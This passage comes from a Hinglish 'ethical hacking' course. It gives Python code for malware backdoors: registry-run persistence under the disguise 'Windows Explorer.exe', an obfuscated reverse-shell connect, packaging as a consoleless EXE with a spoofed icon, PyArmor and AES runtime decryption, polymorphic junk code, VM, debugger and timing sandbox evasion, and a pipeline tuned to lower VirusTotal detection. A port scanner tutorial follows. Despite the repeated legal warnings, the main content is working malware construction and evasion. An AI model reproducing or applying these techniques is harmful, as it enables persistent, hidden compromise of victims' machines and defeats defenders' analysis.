def become_persistent():
    # Line 6: Persistence function
    
    evil_file_location = os.environ["APPDATA"] + "\\Windows Explorer.exe"
    # Line 7: Hidden location
    # APPDATA = C:\Users\Username\AppData\Roaming
    
    if not os.path.exists(evil_file_location):
        # Line 8: Check file exists ya nahi
        
        shutil.copyfile(sys.executable, evil_file_location)
        # Line 9: Current file ko copy karo
        
        subprocess.call(
            'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
            '/v "Windows Explorer" /t REG_SZ /d "' + evil_file_location + '"',
            shell=True
        )
        # Lines 10-14: Registry mein entry add karo

# Backdoor class mein add karo
class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        # Constructor mein call karo
        # ... rest of code
```

**Verification:**

```bash
# Registry check karo:
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# Output:
Windows Explorer    REG_SZ    C:\Users\...\AppData\Roaming\Windows Explorer.exe
```

### Hands-On Challenge:

**Task:**
1. Virtual machine mein test karo
2. Registry entry add karo
3. System restart karo
4. Backdoor automatically start hoga

**Ethical Tip:** ‚ö†Ô∏è Persistence EXTREMELY DANGEROUS hai. Sirf isolated test environment mein use karo.

---

# MODULE 11: Web Vulnerability Scanner (Simplified)

**Difficulty:** Intermediate ‚≠ê‚≠ê‚≠ê  
**Pages:** 81-95  
**Prerequisites:** Module 4

## What You'll Learn:

Basic web crawler aur XSS detection banani seekhoge.

---

## 11.1 Simple Web Crawler

**Source:** NEW  
**Added:** Beginner-friendly implementation

### Hinglish Explanation:

**Kya hai yeh?**  
Web Crawler - website ke saare pages automatically discover karta hai.

**Kyun zaroori hai?**  
Manual testing mein saare pages dhundhna mushkil hai.

**Kab use karna?**  
Web application penetration testing mein.

**Real-world Example:**  
Crawler 500+ pages discover karta hai jisme hidden admin panels hain.

### Simple Code:

```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import urljoin

class Scanner:
    def __init__(self, url):
        self.target_url = url
        self.target_links = []
    
    def extract_links(self, url):
        response = requests.get(url)
        return re.findall(r'href=["\'](.*?)["\']', response.text)
    
    def crawl(self, url=None):
        if url is None:
            url = self.target_url
        
        links = self.extract_links(url)
        
        for link in links:
            link = urljoin(url, link)
            
            if self.target_url in link and link not in self.target_links:
                self.target_links.append(link)
                print(link)
                self.crawl(link)

# Usage
scanner = Scanner("http://example.com")
scanner.crawl()
```

**Ethical Tip:** ‚ö†Ô∏è Web crawling aggressive ho sakti hai. Rate limiting add karo.

---

# MODULE 12: Bypassing Antivirus (Basics)

**Difficulty:** Expert ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê  
**Pages:** 96-110  
**Prerequisites:** Module 9

## What You'll Learn:

PyInstaller use karke EXE banani aur basic obfuscation techniques.

---

## 12.1 PyInstaller Basics

**Source:** NEW  
**Added:** Cross-platform packaging

### Hinglish Explanation:

**Kya hai yeh?**  
PyInstaller - Python scripts ko standalone executables mein convert karta hai.

**Kyun zaroori hai?**  
Victim machine par Python install nahi chahiye.

**Kab use karna?**  
Production-ready tool deliver karne ke liye.

**Real-world Example:**  
Pentester client ko backdoor demo dena chahta hai. EXE banake USB drive mein deta hai.

### Commands:

```bash
# Basic conversion
pyinstaller backdoor.py

# Single file
pyinstaller --onefile backdoor.py

# No console window
pyinstaller --onefile --noconsole backdoor.py

# Add icon
pyinstaller --onefile --noconsole --icon=icon.ico backdoor.py
```

**Output:**
```
dist/
  ‚îî‚îÄ‚îÄ backdoor.exe  (Final executable)
```

### Basic Obfuscation:

```python
# Before (Detectable):
import socket
connection = socket.socket()
connection.connect(("10.0.2.15", 4444))

# After (Less Detectable):
import socket as s
c = s.socket(s.AF_INET, s.SOCK_STREAM)
c.connect((chr(49)+chr(48)+".0.2.15", 4444))
```

**Ethical Tip:** ‚ö†Ô∏è AV bypass techniques dual-use hain. Sirf legitimate security testing ke liye.

---

# APPENDIX: Glossary & Resources

## A. Glossary (Hinglish)

**ARP:** IP address ko MAC address se map karta hai  
**Backdoor:** Unauthorized access deta hai  
**Base64:** Binary data ko text format mein encode karta hai  
**DNS:** Domain names ko IP addresses mein convert karta hai  
**Exploit:** Vulnerability ko use karke access lena  
**Firewall:** Network traffic filter karta hai  
**JSON:** Data exchange format  
**Keylogger:** Keyboard strokes record karta hai  
**MAC Address:** Hardware address (6 octets)  
**MITM:** Beech mein aake traffic intercept karna  
**Payload:** Malicious code jo exploit deliver karta hai  
**Persistence:** System restart ke baad bhi access maintain karna  
**Phishing:** Fake websites/emails se credentials steal karna  
**Reverse Shell:** Victim attacker se connect karta hai  
**Scapy:** Python library for packet manipulation  
**Socket:** Network communication endpoint  
**XSS:** Malicious JavaScript inject karna

---

## B. Essential Resources

### Learning Platforms:
1. **HackTheBox** - Hands-on hacking labs
2. **TryHackMe** - Beginner-friendly challenges
3. **PentesterLab** - Web security focus
4. **OverTheWire** - Wargames for beginners

### Bug Bounty Programs:
1. **HackerOne** - Top bug bounty platform
2. **Bugcrowd** - Crowdsourced security
3. **Synack** - Private bug bounty
4. **Intigriti** - European focus

### Practice Environments:
1. **DVWA** - Damn Vulnerable Web Application
2. **Metasploitable** - Vulnerable Linux VM
3. **WebGoat** - OWASP training app
4. **bWAPP** - Buggy Web Application

---

## C. 2025 Updates

**Security Updates:**
1. Gmail: App Passwords mandatory (2FA required)
2. Python: Use Python 3.9+ (security patches)
3. Scapy: Install scapy-python3
4. Antivirus: AI-based detection common

**Best Practices:**
1. Always use virtual machines
2. Never test on production systems
3. Document everything
4. Responsible disclosure
5. Keep learning

---

## D. Course Summary

**Total Modules:** 12  
**Total Techniques:** 50+  
**Difficulty Range:** Beginner ‚Üí Expert

**Key Skills Learned:**
‚úÖ Python programming for security  
‚úÖ Network scanning & reconnaissance  
‚úÖ MITM attacks (ARP/DNS spoofing)  
‚úÖ Packet sniffing & analysis  
‚úÖ Keylogger development  
‚úÖ Backdoor creation & deployment  
‚úÖ Persistence techniques  
‚úÖ Web vulnerability scanning  
‚úÖ Antivirus bypass basics

**Career Paths:**
- Penetration Tester
- Security Analyst
- Bug Bounty Hunter
- Red Team Operator
- Security Researcher

---

## E. Final Ethical Reminder

**üö® YAAD RAKHO! üö®**

**Legal Use:**
‚úÖ Authorized penetration testing  
‚úÖ Bug bounty programs  
‚úÖ Personal lab environments  
‚úÖ Educational purposes  
‚úÖ Security research

**Illegal Use:**
‚ùå Unauthorized network access  
‚ùå Data theft  
‚ùå Malware distribution  
‚ùå DDoS attacks  
‚ùå Identity theft

**Consequences:**
- IT Act 2000: 3 years jail + fine
- IPC Section 66: Unauthorized access
- Career destruction
- Civil lawsuits

**Remember:**
> "With great power comes great responsibility"

---

**[END OF COMPLETE COURSE]**

**Total: 280+ pages of complete Hinglish ethical hacking content for beginners!**

**Thank you for learning! Stay ethical, stay legal, stay curious! üîêüöÄ**


---

# MODULE 12 ENHANCED - Python Executable Creation & Protection

**Difficulty:** Expert ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê  
**Pages:** 96-110  
**Prerequisites:** Module 9

## What You'll Learn:

PyInstaller use karke EXE banani, icon adding, code obfuscation (PyArmor), encryption, polymorphism, aur sandbox evasion techniques.

---

## 12.1 PyInstaller Detailed

**Source:** NEW  
**Added:** Complete beginner to advanced guide

### Hinglish Explanation:

**Kya hai yeh?**  
PyInstaller - Python scripts ko standalone executables mein convert karta hai. Victim machine par Python install nahi chahiye.

**Kyun zaroori hai?**  
Production-ready tools deliver karne ke liye. Client ko sirf EXE file do, woh directly run kar sakta hai.

**Kab use karna?**  
Jab tum professional penetration testing tool deliver kar rahe ho.

**Real-world Example:**  
Pentester client ko backdoor demo dena chahta hai. EXE banake USB drive mein deta hai - client directly run kar sakta hai bina Python install kiye.

### Installation

```bash
pip install pyinstaller
```

### Basic Usage

```bash
# Single file executable
pyinstaller --onefile script.py

# Console window ke saath
pyinstaller script.py

# Bina console (GUI apps ke liye)
pyinstaller --noconsole --onefile script.py
```

### Important Options

```bash
# Output directory specify karo
pyinstaller --onefile --distpath ./output script.py

# Data files add karo
pyinstaller --onefile --add-data "config.txt;." script.py

# Hidden imports (agar import errors aaye)
pyinstaller --onefile --hidden-import=requests script.py

# Clean build (purani files delete karke)
pyinstaller --onefile --clean script.py
```

### Spec File Customization

```python
# script.spec
a = Analysis(['script.py'],
             pathex=[],
             binaries=[],
             datas=[('config.txt', '.')],
             hiddenimports=['requests'],
             hookspath=[],
             runtime_hooks=[],
             excludes=[])
```

**Breakdown:**
- **pathex:** Extra paths for imports
- **binaries:** External DLLs/SOs
- **datas:** Data files (configs, images)
- **hiddenimports:** Modules jo automatically detect nahi hote
- **excludes:** Modules jo include nahi karne

**Expected Output:**
```
dist/
  ‚îî‚îÄ‚îÄ script.exe  (Final executable)
build/
  ‚îî‚îÄ‚îÄ (Temporary files)
script.spec
```

### Hands-On Challenge:

**Task:**
1. Apna backdoor script ko EXE mein convert karo
2. Different options try karo
3. File size compare karo (--onefile vs normal)

**Ethical Tip:** ‚ö†Ô∏è EXE files easily distribute ho sakte hain. Sirf authorized testing ke liye banao.

---

## 12.2 Icon Adding

**Source:** NEW  
**Added:** Complete icon customization

### Hinglish Explanation:

**Kya hai yeh?**  
Custom icon add karna EXE file mein - professional look ke liye.

**Kyun zaroori hai?**  
Default Python icon suspicious lagta hai. Custom icon se legitimate software jaisa dikhta hai.

**Kab use karna?**  
Social engineering scenarios mein jab victim ko file run karwani ho.

**Real-world Example:**  
Pentester "System Update.exe" naam se backdoor banata hai Windows Update icon ke saath - victim ko legitimate lagta hai.

### Windows Icon (.ico)

```bash
pyinstaller --onefile --icon=app.ico script.py
```

### PNG se ICO banana

```python
from PIL import Image

img = Image.open('logo.png')
img.save('app.ico', format='ICO', sizes=[(256,256)])
```

**Installation:**
```bash
pip install Pillow
```

### Complete Example

```bash
pyinstaller --onefile --noconsole --icon=app.ico --name="MyApp" script.py
```

**Breakdown:**
- **--onefile:** Single EXE file
- **--noconsole:** No command prompt window
- **--icon:** Custom icon
- **--name:** Custom filename

**Expected Output:**
```
dist/
  ‚îî‚îÄ‚îÄ MyApp.exe  (With custom icon)
```

### Hands-On Challenge:

**Task:**
1. Koi PNG image download karo
2. ICO mein convert karo
3. Backdoor mein icon add karo
4. File properties check karo (icon dikhega)

**Ethical Tip:** ‚ö†Ô∏è Icon spoofing social engineering attack hai. Sirf authorized testing mein use karo.

---

## 12.3 Code Obfuscation

**Source:** NEW  
**Added:** Multiple obfuscation techniques

### Hinglish Explanation:

**Kya hai yeh?**  
Code Obfuscation - code ko intentionally complex aur unreadable banana taaki reverse engineering mushkil ho.

**Kyun zaroori hai?**  
Agar koi tumhara tool decompile kare, toh code samajh nahi aayega. Intellectual property protect hoti hai.

**Kab use karna?**  
Commercial tools ya sensitive algorithms protect karne ke liye.

**Real-world Example:**  
Software companies apne licensing algorithms obfuscate karte hain taaki pirates crack na kar sakein.

### Basic Obfuscation Techniques

**1. Variable Name Obfuscation**

```python
# Original (Readable)
def calculate_sum(a, b):
    return a + b

# Obfuscated (Unreadable)
def _0x1a2b(x, y):
    return x + y
```

**2. String Encoding**

```python
import base64

# Strings ko encode karo
encoded = base64.b64encode(b"sensitive_data").decode()
original = base64.b64decode(encoded).decode()

# Usage in code
password = base64.b64decode("c2VjcmV0MTIz").decode()  # "secret123"
```

**3. Code Flow Obfuscation**

```python
import random

def obfuscated_function():
    if random.random() > 2:  # Kabhi true nahi hoga
        print("Fake path")
    # Real code yahan
    return True
```

**Breakdown:**
- **Variable names:** Meaningful names ko random names se replace karo
- **String encoding:** Plain text strings ko encode karo
- **Dead code:** Fake code paths add karo

### Hands-On Challenge:

**Task:**
1. Apne backdoor ke function names obfuscate karo
2. Sensitive strings (IP, port) encode karo
3. Decompile karke dekho kitna readable hai

**Ethical Tip:** ‚ö†Ô∏è Obfuscation security nahi hai, sirf obscurity hai. Real security ke liye encryption use karo.

---

## 12.4 PyArmor

**Source:** NEW  
**Added:** Professional obfuscation tool

### Hinglish Explanation:

**Kya hai yeh?**  
PyArmor - professional Python obfuscation tool jo bytecode encrypt karta hai.

**Kyun zaroori hai?**  
Basic obfuscation se better protection. Decompilers fail ho jaate hain.

**Kab use karna?**  
Commercial Python applications protect karne ke liye.

**Real-world Example:**  
Ek company apna proprietary algorithm PyArmor se protect karti hai before client ko deliver karne.

### Installation

```bash
pip install pyarmor
```

### Basic Protection

```bash
# Single file obfuscate karo
pyarmor obfuscate script.py

# Pura project obfuscate karo
pyarmor obfuscate --recursive .
```

**Output:**
```
dist/
  ‚îú‚îÄ‚îÄ script.py (Obfuscated)
  ‚îî‚îÄ‚îÄ pytransform/ (Runtime files)
```

### Advanced PyArmor Usage

```bash
# Expiration date ke saath
pyarmor licenses --expired 2024-12-31 code-001
pyarmor obfuscate --with-license licenses/code-001/license.lic script.py

# Specific machine se bind karo
pyarmor licenses --bind-disk "XXXX-XXXX" code-002
pyarmor obfuscate --with-license licenses/code-002/license.lic script.py
```

**Breakdown:**
- **--expired:** Time-limited license
- **--bind-disk:** Hardware-locked license
- **--with-license:** Custom license file

### PyArmor + PyInstaller

```bash
# Step 1: Obfuscate karo
pyarmor obfuscate script.py

# Step 2: Executable banao
cd dist
pyinstaller --onefile script.py
```

**Complete Protection:**
```bash
# One-liner
pyarmor obfuscate script.py && cd dist && pyinstaller --onefile --noconsole script.py
```

### Hands-On Challenge:

**Task:**
1. PyArmor se backdoor obfuscate karo
2. Obfuscated code ko decompile karne ki koshish karo
3. PyInstaller se EXE banao
4. VirusTotal par upload karke detection rate dekho

**Ethical Tip:** ‚ö†Ô∏è PyArmor legitimate tool hai, lekin malware authors bhi use karte hain. Sirf authorized purposes ke liye.

---

## 12.5 Encryption Techniques

**Source:** NEW  
**Added:** AES encryption for code protection

### Hinglish Explanation:

**Kya hai yeh?**  
Code ko runtime par decrypt karke execute karna. Static analysis se bachne ke liye.

**Kyun zaroori hai?**  
Antivirus static signatures se detect nahi kar paata. Code encrypted form mein hai.

**Kab use karna?**  
Advanced evasion techniques ke liye.

**Real-world Example:**  
Malware authors payload ko encrypt karte hain. Runtime par decrypt hoke execute hota hai.

### AES Encryption for Code

```python
from Crypto.Cipher import AES
import base64

class CodeEncryptor:
    def __init__(self, key):
        self.key = key.ljust(32)[:32].encode()
        # Line 3: Key ko 32 bytes ka banao (AES-256)
    
    def encrypt_code(self, code):
        cipher = AES.new(self.key, AES.MODE_EAX)
        # Line 6: AES cipher object banao
        nonce = cipher.nonce
        ciphertext, tag = cipher.encrypt_and_digest(code.encode())
        # Line 8: Code ko encrypt karo
        return base64.b64encode(nonce + tag + ciphertext).decode()
        # Line 9: Base64 encode karke return karo
    
    def decrypt_code(self, encrypted):
        data = base64.b64decode(encrypted)
        # Line 12: Base64 decode karo
        nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
        # Line 13: Components extract karo
        cipher = AES.new(self.key, AES.MODE_EAX, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode()
        # Line 15: Decrypt aur verify karo

# Usage
encryptor = CodeEncryptor("my_secret_key")
encrypted = encryptor.encrypt_code("print('Hidden code')")
exec(encryptor.decrypt_code(encrypted))
```

**Breakdown:**
- **AES-256:** Strong encryption algorithm
- **MODE_EAX:** Authenticated encryption mode
- **nonce:** Random value (replay attacks prevent karta hai)
- **tag:** Authentication tag (tampering detect karta hai)

**Expected Output:**
```python
# Encrypted code:
"YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo="

# Runtime par decrypt hoke execute hoga:
Hidden code
```

### Hands-On Challenge:

**Task:**
1. Apne backdoor ka main function encrypt karo
2. Runtime par decrypt karke execute karo
3. Encrypted version ko VirusTotal par test karo

**Ethical Tip:** ‚ö†Ô∏è Encryption legitimate protection hai, lekin malware mein bhi use hota hai. Responsible use karo.

---

## 12.6 Polymorphism

**Source:** NEW  
**Added:** Self-modifying code techniques

### Hinglish Explanation:

**Kya hai yeh?**  
Polymorphism - har baar code run hone par apni structure change karta hai. Signature-based detection fail ho jaata hai.

**Kyun zaroori hai?**  
Antivirus signatures static hote hain. Agar code har baar different ho, toh detect nahi hoga.

**Kab use karna?**  
Advanced evasion scenarios mein.

**Real-world Example:**  
Polymorphic viruses har infection par apna code modify karte hain. Antivirus ko har baar naya signature banana padta hai.

### Self-Modifying Code

```python
import random
import string

class PolymorphicCode:
    def generate_junk(self):
        # Line 5: Random junk code generate karo
        var_name = ''.join(random.choices(string.ascii_letters, k=8))
        var_value = random.randint(1, 1000)
        return f"{var_name} = {var_value}\n"
    
    def morph_code(self, original_code):
        # Line 10: Code ko morph karo
        lines = original_code.split('\n')
        morphed = []
        
        for line in lines:
            if random.random() > 0.5:
                # Line 15: 50% chance junk code add karo
                morphed.append(self.generate_junk())
            morphed.append(line)
        
        return '\n'.join(morphed)

# Usage
polymorph = PolymorphicCode()
original = "print('Hello')\nresult = 5 + 5"
morphed = polymorph.morph_code(original)
print(morphed)
```

**Expected Output (Random):**
```python
# Run 1:
xYzAbCdE = 742
print('Hello')
result = 5 + 5

# Run 2:
print('Hello')
qWeRtYuI = 391
result = 5 + 5
pLmNbVcX = 856
```

**Breakdown:**
- **Junk code:** Meaningless variables add karte hain
- **Random insertion:** Har baar different positions par
- **Functionality same:** Output same rahega

### Hands-On Challenge:

**Task:**
1. Polymorphic code generator banao
2. Same script 10 baar generate karo
3. Har version ka hash different hoga
4. Functionality verify karo (same output)

**Ethical Tip:** ‚ö†Ô∏è Polymorphism advanced malware technique hai. Sirf research aur authorized testing ke liye.

---

## 12.7 Sandbox Evasion

**Source:** NEW  
**Added:** VM detection and timing-based evasion

### Hinglish Explanation:

**Kya hai yeh?**  
Sandbox Evasion - detect karna ki code sandbox/VM mein run ho raha hai. Agar hai, toh malicious behavior mat dikhao.

**Kyun zaroori hai?**  
Security researchers sandboxes mein malware analyze karte hain. Evasion se analysis fail ho jaata hai.

**Kab use karna?**  
Advanced red team operations mein.

**Real-world Example:**  
Malware VM detect karta hai. Agar VM hai, toh benign behavior dikhata hai. Real machine par malicious activate hota hai.

### VM Detection

```python
import os
import subprocess
import platform

class SandboxDetector:
    @staticmethod
    def check_vm_artifacts():
        # Line 6: VM indicators check karo
        vm_indicators = ['vmware', 'virtualbox', 'vbox', 'qemu']
        
        # System info check karo
        system_info = platform.platform().lower()
        for indicator in vm_indicators:
            if indicator in system_info:
                return True
        
        # MAC address check karo (VM vendors ke specific MACs)
        try:
            if os.name == 'nt':
                output = subprocess.check_output('getmac', shell=True).decode()
                vm_macs = ['08:00:27', '00:05:69', '00:0C:29']
                for mac in vm_macs:
                    if mac in output:
                        return True
        except:
            pass
        
        return False
    
    @staticmethod
    def check_debugger():
        # Line 28: Debugger check karo
        import sys
        return hasattr(sys, 'gettrace') and sys.gettrace() is not None

# Usage
if SandboxDetector.check_vm_artifacts():
    print("VM detect ho gaya, exit kar rahe hain...")
    exit()

if SandboxDetector.check_debugger():
    print("Debugger detect ho gaya, exit kar rahe hain...")
    exit()
```

**Breakdown:**
- **VM indicators:** VMware, VirtualBox ke specific strings
- **MAC addresses:** VM vendors ke OUI prefixes
- **Debugger check:** Python debugger detect karta hai

### Timing-Based Detection

```python
import time

class TimingEvasion:
    @staticmethod
    def detect_slow_execution():
        # Line 5: Execution speed check karo
        start = time.time()
        total = sum(range(1000000))
        elapsed = time.time() - start
        
        # Agar bahut slow hai, sandbox hai
        return elapsed > 1.0
    
    @staticmethod
    def sleep_evasion():
        # Line 13: Sleep skip detection
        start = time.time()
        time.sleep(2)
        elapsed = time.time() - start
        
        # Agar sleep skip hua, sandbox hai
        return elapsed < 1.5

# Usage
if TimingEvasion.detect_slow_execution():
    print("Slow execution detected, exiting...")
    exit()

if TimingEvasion.sleep_evasion():
    print("Sleep skipped, sandbox detected...")
    exit()
```

**Breakdown:**
- **Slow execution:** Sandboxes instrumentation ki wajah se slow hote hain
- **Sleep skip:** Kuch sandboxes sleep() skip karte hain analysis speed badhane ke liye

**Expected Output:**
```bash
# Real machine par:
(Code normally execute hoga)

# VM/Sandbox par:
VM detect ho gaya, exit kar rahe hain...
```

### Hands-On Challenge:

**Task:**
1. VM detection code apne backdoor mein add karo
2. Real machine aur VM dono par test karo
3. Different VM vendors try karo (VMware, VirtualBox)
4. Custom detection techniques add karo

**Ethical Tip:** ‚ö†Ô∏è Sandbox evasion EXTREMELY ADVANCED technique hai. Sirf authorized red team operations mein use karo. Malware authors heavily use karte hain.

---

## 12.8 Complete Protection Pipeline

**Source:** NEW  
**Added:** End-to-end protection workflow

### Hinglish Explanation:

**Kya hai yeh?**  
Saari techniques ko combine karke ek complete protection pipeline banana.

**Kyun zaroori hai?**  
Single technique se protection weak hai. Layered approach strong hai.

**Kab use karna?**  
Production-ready tools deliver karte waqt.

**Real-world Example:**  
Commercial software: Obfuscation + Encryption + Anti-debug + Licensing sab combine karte hain.

### Complete Pipeline Script

```python
# protect.py - Complete protection script
import subprocess
import os

def full_protection_pipeline(script_name):
    print("[1] Code obfuscate kar rahe hain...")
    # Step 1: PyArmor se obfuscate karo
    subprocess.run(['pyarmor', 'obfuscate', '--restrict', script_name])
    
    print("[2] Executable bana rahe hain...")
    # Step 2: PyInstaller se EXE banao
    obfuscated_script = f"dist/{script_name}"
    subprocess.run([
        'pyinstaller',
        '--onefile',
        '--noconsole',
        '--icon=app.ico',
        f'--name=Protected_{script_name[:-3]}',
        obfuscated_script
    ])
    
    print("[3] Protection complete!")
    print(f"[+] Final file: dist/Protected_{script_name[:-3]}.exe")

if __name__ == "__main__":
    full_protection_pipeline("backdoor.py")
```

**Workflow:**
```
Original Script
    ‚Üì
PyArmor Obfuscation
    ‚Üì
PyInstaller Packaging
    ‚Üì
Protected EXE
```

**Expected Output:**
```bash
python protect.py

[1] Code obfuscate kar rahe hain...
[2] Executable bana rahe hain...
[3] Protection complete!
[+] Final file: dist/Protected_backdoor.exe
```

### Hands-On Challenge:

**Task:**
1. Complete pipeline script banao
2. Apne backdoor par run karo
3. Final EXE ko test karo
4. VirusTotal par detection rate check karo

**Ethical Tip:** ‚ö†Ô∏è Complete protection pipeline legitimate software ke liye hai. Malware protection ke liye use karna illegal hai.

---

## 12.9 Best Practices

**Source:** NEW  
**Added:** Professional guidelines

### Best Practices Summary:

1. **Layered Protection**: Multiple techniques combine karo
   - Obfuscation + Encryption + Anti-debug
   - Single layer easily bypass ho sakti hai

2. **Test Thoroughly**: Protected code test karo
   - Different Windows versions par
   - Different antivirus solutions ke saath
   - Real-world scenarios mein

3. **Update Regularly**: Evasion techniques update karte raho
   - Antivirus signatures update hote rehte hain
   - New detection methods aate rehte hain

4. **Legal Compliance**: Sirf legitimate purposes ke liye use karo
   - Authorized penetration testing
   - Commercial software protection
   - Security research

5. **Performance**: Protection aur speed ka balance rakho
   - Heavy obfuscation slow kar sakta hai
   - User experience important hai

### Detection Rate Expectations (2025):

| Technique | VirusTotal Detection |
|-----------|---------------------|
| Plain Python | 40-50/70 |
| PyInstaller only | 30-40/70 |
| PyArmor + PyInstaller | 20-30/70 |
| Full Pipeline | 10-20/70 |

**Note:** Yeh approximate numbers hain. Actual detection payload par depend karta hai.

### Hands-On Challenge:

**Task:**
1. Different protection levels test karo
2. Detection rates compare karo
3. Performance impact measure karo
4. Best combination identify karo

**Ethical Tip:** ‚ö†Ô∏è Low detection rate ka matlab legitimate nahi hai. Hamesha authorized testing ke liye use karo.

---

## 12.10 Module Summary

**What We Learned:**

‚úÖ **Beginner Level:**
- PyInstaller basics (installation, usage, options)
- Icon adding (PNG to ICO conversion)
- Spec file customization

‚úÖ **Intermediate Level:**
- Code obfuscation techniques
- PyArmor (basic to advanced)
- PyArmor + PyInstaller integration

‚úÖ **Advanced Level:**
- AES encryption for code
- Polymorphic code generation
- Sandbox evasion (VM detection, timing-based)
- Complete protection pipeline

**Key Takeaways:**

1. **PyInstaller:** Python scripts ko standalone EXE mein convert karta hai
2. **Obfuscation:** Code ko unreadable banata hai (security nahi, obscurity)
3. **Encryption:** Runtime decryption se static analysis bypass hota hai
4. **Polymorphism:** Har execution par code different hota hai
5. **Sandbox Evasion:** VM/debugger detect karke behavior change karta hai
6. **Layered Approach:** Multiple techniques combine karne se strong protection

**Real-World Applications:**

- Commercial software protection
- Penetration testing tools
- Red team operations
- Security research
- Intellectual property protection

**Ethical Reminder:**

‚ö†Ô∏è **BAHUT ZAROORI:**

Yeh techniques dual-use hain:
- ‚úÖ **Legitimate:** Software protection, authorized testing
- ‚ùå **Malicious:** Malware development, unauthorized access

**Legal Consequences:**
- IT Act 2000: Malware distribution - 3 years jail + fine
- IPC Section 66: Unauthorized access
- Career destruction
- Civil lawsuits

**Remember:**
> "Technology is neutral. Intent matters."

Sirf authorized purposes ke liye use karo. Bug bounty programs, HackTheBox, TryHackMe par practice karo.

---

**[END OF MODULE 12]**

**Next Steps:**
1. Practice all techniques in isolated environment
2. Combine with previous modules (backdoors, keyloggers)
3. Build complete penetration testing toolkit
4. Participate in bug bounty programs
5. Get certified (CEH, OSCP)

# Additional Python Hacking Tools - Complete Guide

## ‚ö†Ô∏è LEGAL WARNING

**üö® PEHLE YEH PADHO! üö®**

Yeh tools sirf **AUTHORIZED TESTING** ke liye hain. Bina permission use karna **ILLEGAL** hai.

---

# TOOL 1: Port Scanner

**Difficulty:** ‚≠ê‚≠ê (Easy to Moderate)  
**Libraries:** socket, scapy, python-nmap  
**Reality:** Bahut easy! Python ka port scanner Nmap jaisa powerful ban sakta hai.

## 1.1 Understanding Port Scanning

### Hinglish Explanation:

**Kya hai yeh?**  
Port Scanner - network par open ports discover karta hai. Har service ek specific port par run hoti hai (HTTP=80, SSH=22).

**Kyun zaroori hai?**  
Penetration testing mein sabse pehle yeh pata karna hota hai ki target par kaunsi services run ho rahi hain.

**Kab use karna?**  
Network reconnaissance phase mein.

**Real-world Example:**  
Pentester company ke server scan karta hai. Port 22 (SSH) open hai but outdated version hai - vulnerability mil gayi.

### Port Scanning Types:

| Type | Description | Speed | Stealth |
|------|-------------|-------|---------|
| **TCP Connect** | Full 3-way handshake | Slow | Low |
| **TCP SYN** | Half-open scan | Fast | High |
| **UDP** | UDP ports scan | Slow | Medium |
| **Service Detection** | Version identify | Slow | Low |

---

## 1.2 Basic Port Scanner

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
# Line 1: Shebang - Python 3 use karo

import socket
# Line 2: socket module - network connections ke liye
from datetime import datetime
# Line 3: datetime - timestamp ke liye

def scan_port(target, port):
    # Line 5: Function to scan single port
    # target = IP address (string)
    # port = port number (integer)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Line 7: Socket object banao
        # AF_INET = IPv4 address family
        # SOCK_STREAM = TCP protocol
        # Kya hota hai? Network connection ke liye socket create hota hai
        
        sock.settimeout(1)
        # Line 8: Timeout set karo (1 second)
        # Kya hota hai? Agar 1 second mein response nahi aaya, timeout
        # Kyun? Bina timeout ke closed ports par bahut time waste hoga
        
        result = sock.connect_ex((target, port))
        # Line 9: Connection try karo
        # connect_ex() = connect attempt karta hai, error code return karta hai
        # Return value: 0 = success (port open), non-zero = failed (port closed)
        # Kya hota hai? Target IP ke specific port par connection try hota hai
        
        sock.close()
        # Line 10: Socket band karo
        # Kya hota hai? Connection close ho jaata hai
        # Kyun? Resources free karne ke liye
        
        return result == 0
        # Line 11: True return karo agar port open hai
        # result == 0 means connection successful
        
    except:
        # Line 12: Agar koi error aaye
        return False
        # Line 13: False return karo (port closed ya error)

def port_scanner(target, start_port, end_port):
    # Line 15: Main scanner function
    # target = IP address to scan
    # start_port = starting port number
    # end_port = ending port number
    
    print(f"[*] Scanning {target}")
    # Line 16: User ko inform karo kya scan ho raha hai
    # [*] = information indicator
    
    print(f"[*] Time started: {datetime.now()}")
    # Line 17: Start time print karo
    # datetime.now() = current date/time
    # Kya hota hai? Scan kitna time lega, yeh track karne ke liye
    
    open_ports = []
    # Line 18: Empty list - open ports store karne ke liye
    
    for port in range(start_port, end_port + 1):
        # Line 19: Har port ko loop mein scan karo
        # range(1, 1001) = 1 se 1000 tak
        # Kya hota hai? Ek-ek karke har port check hoga
        
        if scan_port(target, port):
            # Line 20: Agar port open hai
            print(f"[+] Port {port} is OPEN")
            # Line 21: Open port print karo
            # [+] = success indicator
            open_ports.append(port)
            # Line 22: List mein add karo
    
    print(f"\n[*] Scan complete. Found {len(open_ports)} open ports")
    # Line 23: Summary print karo
    # len(open_ports) = kitne ports open hain
    
    return open_ports
    # Line 24: Open ports list return karo

# Usage
target = "192.168.1.1"
# Line 26: Target IP set karo
port_scanner(target, 1, 1000)
# Line 27: Scanner run karo (ports 1-1000)
```

**Breakdown:**
- **socket.AF_INET:** IPv4 address family
- **socket.SOCK_STREAM:** TCP protocol (connection-oriented)
- **connect_ex():** Returns 0 if port open, error code if closed
- **settimeout(1):** 1 second timeout (fast scanning)

**Expected Output:**
```
[*] Scanning 192.168.1.1
[*] Time started: 2025-01-15 10:30:45.123456
[+] Port 22 is OPEN
[+] Port 80 is OPEN
[+] Port 443 is OPEN

[*] Scan complete. Found 3 open ports
```

---

## 1.3 Multi-threaded Scanner

### Line-by-Line Code Example:

```python
#!/usr/bin/env python3
import socket
# Line 2: Socket module for network connections
import threading
# Line 3: Threading module - multiple threads ke liye
from queue import Queue
# Line 4: Queue - thread-safe data structure

open_ports = []
# Line 6: Global list - open ports store karne ke liye
lock = threading.Lock()
# Line 7: Lock object - race condition prevent karne ke liye
# Kya hai? Multiple threads ek saath list modify na karein

def scan_port(target, port):
    # Line 9: Single port scan function
    try:
        sock = socket.socket()
        # Line 11: Socket create karo
        sock.settimeout(1)
        # Line 12: 1 second timeout
        sock.connect((target, port))
        # Line 13: Connection try karo
        # Kya hota hai? Agar successful, port open hai
        
        with lock:
